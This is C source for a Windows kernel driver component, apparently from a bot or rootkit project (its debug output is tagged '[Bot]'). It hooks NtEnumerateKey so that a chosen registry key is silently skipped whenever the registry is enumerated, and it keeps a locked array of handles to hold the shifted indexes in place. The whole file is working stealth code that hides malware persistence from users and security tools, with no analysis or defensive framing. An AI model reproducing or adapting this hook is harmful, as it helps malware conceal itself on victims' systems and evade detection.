#include <ntddk.h>

#include "enumkey.h"
#include "handler.h"

UNICODE_STRING hiddenReg;
PHANDLE keyHandleArr;
PKSPIN_LOCK keyArrLock;

static void getKeyName(PUNICODE_STRING keyname, PVOID keyInfo, KEY_INFORMATION_CLASS keyInfoClass) {
	switch (keyInfoClass) {
		case KeyBasicInformation:
			keyname->Buffer = ((PKEY_BASIC_INFORMATION)keyInfo)->Name;
			keyname->Length = ((PKEY_BASIC_INFORMATION)keyInfo)->NameLength;
			break;
		case KeyNodeInformation:
			keyname->Buffer = ((PKEY_NODE_INFORMATION)keyInfo)->Name;
			keyname->Length = ((PKEY_NODE_INFORMATION)keyInfo)->NameLength;
			break;
		case KeyNameInformation:
			keyname->Buffer = ((PKEY_NAME_INFORMATION)keyInfo)->Name;
			keyname->Length = ((PKEY_NAME_INFORMATION)keyInfo)->NameLength;
			break;
		default:
			keyname->Buffer = NULL;
			keyname->Length = 0;
			break;
	}
	keyname->MaximumLength = keyname->Length;
}

NTSTATUS NTAPI hookNtEnumerateKey(
	HANDLE KeyHandle,
	ULONG Index,
	KEY_INFORMATION_CLASS KeyInformationClass,
	PVOID KeyInformation,
	ULONG Length,
	PULONG ResultLength
) {
	NTSTATUS status;
	UNICODE_STRING us;
	SIZE_T i, j;
	BOOLEAN isInArr;
	KIRQL oldIrql;

	KeAcquireSpinLock(keyArrLock, &oldIrql);
	for (i = 0, isInArr = FALSE; i < MAX_KEYHANDLEARR; ++i) {
		if (!keyHandleArr[i]) {
			break;
		}
		if (keyHandleArr[i] == KeyHandle) {
			isInArr = TRUE;
			break;
		}
	}
	KeReleaseSpinLock(keyArrLock, oldIrql);

	if (isInArr) {
		status = origNtEnumerateKey(KeyHandle, Index + 1, KeyInformationClass, KeyInformation, Length, ResultLength);
		if (status == STATUS_NO_MORE_ENTRIES) {
			//remove from array
			KeAcquireSpinLock(keyArrLock, &oldIrql);
			for (j = 0; j < MAX_KEYHANDLEARR; ++j) {
				if (!keyHandleArr[j]) {
					break;
				}
			}
			//last item and one item
			if (i == j - 1) {
				keyHandleArr[i] = NULL;
			//other
			} else {
				keyHandleArr[i] = keyHandleArr[j - 1];
				keyHandleArr[j - 1] = NULL;
			}
			KeReleaseSpinLock(keyArrLock, oldIrql);
		}
	} else {
		status = origNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
	
		if (NT_SUCCESS(status) && (
			KeyInformationClass == KeyBasicInformation ||
			KeyInformationClass == KeyNodeInformation ||
			KeyInformationClass == KeyNameInformation)) {
	
			getKeyName(&us, KeyInformation, KeyInformationClass);
			if (!RtlCompareUnicodeString(&us, &hiddenReg, TRUE)) {
				DbgPrintEx(0, 0, "[Bot] key hook %wZ\n", us);
				status = origNtEnumerateKey(KeyHandle, Index + 1, KeyInformationClass, KeyInformation, Length, ResultLength);
				if (status != STATUS_NO_MORE_ENTRIES && i < MAX_KEYHANDLEARR) {
					KeAcquireSpinLock(keyArrLock, &oldIrql);
					keyHandleArr[i] = KeyHandle;
					KeReleaseSpinLock(keyArrLock, oldIrql);
				}
			}
		}
	}

	return status;
}